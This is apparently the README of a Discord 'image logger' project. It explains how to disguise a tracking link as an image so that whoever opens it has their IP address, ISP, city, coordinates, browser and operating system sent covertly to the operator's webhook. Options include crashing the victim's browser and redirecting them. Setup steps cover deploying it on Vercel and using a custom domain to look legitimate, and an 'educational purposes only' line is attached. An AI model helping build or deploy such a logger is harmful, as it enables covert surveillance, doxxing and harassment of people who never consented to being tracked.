# 🖼️ Discord Image Logger

## 📖 Table of Contents
- [ℹ️ About](#ℹ️-about)
- [✨ Features](#✨-features)
- [⚙️ Configuration](#⚙️-configuration)
  - [📌 Annotations](#📌-annotations)
- [🛠️ Setup](#🛠️-setup)
- [⚠️ Disclaimer](#⚠️-disclaimer)
- [🌟 Support the Project](#🌟-support-the-project)
- [📜 License](#📜-license)

## ℹ️ About
Discord Image Logger is a tool that i made designed to redirect users to a specific link through an image. This method allows you to lead someone to almost any site while also collecting detailed user information through a built-in **IP logger**.

## ✨ Features
- Fast, Free, and Easy to Use!
- 100% Untraceable and Anonymous!
- Requires only clicking "Open Original"!
- Gathers as much data as possible, including GPS-based location!
- Actively developed with future feature updates! Have ideas? Let us know!

## ⚙️ Configuration
Before setting up, edit the necessary values in `main.py` as described below:

- **WEBHOOK**: Your Discord webhook URL.
- **IMAGE**: A direct link to your desired image.
- **IMAGEARGUMENT**: Enables dynamic image URLs (See Annotation #1).
- **USERNAME**: The username displayed in the embed.
- **COLOR**: Sidebar color of the embed.
- **DOCRASHBROWSER**: Crashes the user's browser upon access.
- **DOMESSAGE**: Displays a custom message upon clicking.
- **MESSAGE**: The custom message to show.
- **RICHMESSAGE**: Enables rich messages with user-specific details (See Annotation #2).
- **VPNCHECK**: Prevents VPN users from spamming the webhook.
- **LINKALERTS**: Notifies when someone sends an image logging link.
- **BUGGEDIMAGE**: Displays a loading image on Discord.
- **ANTIBOT**: Blocks bot interactions.
- **REDIRECT**: Redirects the user to a specific page.
- **PAGE**: The destination page for redirection.

### 📌 Annotations
#### 1) IMAGEARGUMENT
This feature allows providing an image URL dynamically via a Base64-encoded parameter.

**Example:** `https://your.image.logger/api/logger?img=bXlkb21haW4uY29tL2ltYWdlLnBuZw==`

If no `url` or `ID` argument is provided, the default configured image will be used.

#### 2) RICHMESSAGE
Rich messages allow embedding user-specific data into messages using placeholders from the table below:

**Supported Variables:**
- `{ip}` - User's IP Address
- `{isp}` - Internet Service Provider
- `{asn}` - Autonomous System Number
- `{country}` - Country of IP
- `{region}` - Region of IP
- `{city}` - City of IP
- `{lat}` - Latitude
- `{long}` - Longitude
- `{timezone}` - Timezone
- `{mobile}` - Indicates mobile network usage
- `{vpn}` - Detects VPN/Proxy usage
- `{bot}` - Indicates if the user is a bot
- `{browser}` - User's browser
- `{os}` - User's operating system

## 🛠️ Setup
Follow these steps to deploy the logger:

1. **Create a GitHub repository** (Private recommended to protect webhook details).
2. **Create a folder named `api`** and place `requirements.txt` and `main.py` inside. *(Rename `main.py` if needed, e.g., `catpicture.py` for `/api/catpicture`.)*
3. *(Optional)* Create an `index.html` in the root (not inside `api`) with the following:
   ```html
   <meta http-equiv="refresh" content="0;url=./api/main.py">
   ```
   *(Modify `main.py` based on your filename.)* This makes `your.site` redirect automatically.
4. **Deploy via Vercel**:
   - Go to [Vercel](https://vercel.com) and log in via GitHub.
   - Click **Add New** -> **Import GitHub Repository**.
   - Deploy your project and copy the assigned domain (`project.vercel.app`).
5. **Send the link!**
   - If you skipped step 3, append `/api/main` (e.g., `project.vercel.app/api/main`).
   - Ensure `.py` is omitted from the URL to avoid warnings.
6. *(Optional)* Use a custom domain for a more professional look.

## ⚠️ Disclaimer
This project is **not** a "one-click" image logger. Be cautious of scams claiming to steal credentials or execute code via images alone. Always avoid downloading or running untrusted EXE files.

## 🌟 Support the Project
If you find this project useful, consider giving it a **star** on GitHub! ⭐

## 📜 License
This tool is intended for **educational and research purposes only**. Use responsibly.
